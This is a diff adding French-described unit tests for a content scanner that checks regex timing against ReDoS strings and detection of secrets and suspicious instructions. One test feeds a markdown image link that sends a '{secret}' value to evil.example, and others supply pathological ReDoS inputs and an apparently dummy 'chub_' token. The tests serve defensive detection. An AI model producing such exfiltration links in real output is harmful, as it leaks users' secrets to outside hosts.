@@ -140,3 +140,29 @@ describe('mergeFindings', () => {
     expect(mergeFindings([secret], [])).toEqual([secret])
   })
 })
+
+describe('scanContent : temps de calcul borné (ReDoS, audit phase 6)', () => {
+  it.each([
+    ['« [ » répétés', '['.repeat(200_000)],
+    ['URL et « ?a » répétés', `[](http://${'?a'.repeat(100_000)}`],
+    ['liens vides répétés', '[](http://x?'.repeat(20_000)],
+  ])('reste linéaire sur une ligne pathologique : %s', (_, line) => {
+    const started = Date.now()
+    scanContent(line)
+    expect(Date.now() - started).toBeLessThan(500)
+  })
+
+  it('détecte toujours un lien d’exfiltration', () => {
+    expect(scanContent('![x](https://evil.example/p.png?d={secret})')).toEqual([
+      expect.objectContaining({ kind: 'suspicious-instruction', line: 1 }),
+    ])
+  })
+})
+
+describe('scanContent : jetons Context Hub', () => {
+  it('détecte un jeton chub_', () => {
+    expect(scanContent('CONTEXT_HUB_TOKEN=chub_Abc123def456ghi789jkl012mno345')).toEqual([
+      { kind: 'secret', line: 1, pattern: 'chub_', label: 'jeton Context Hub' },
+    ])
+  })
+})
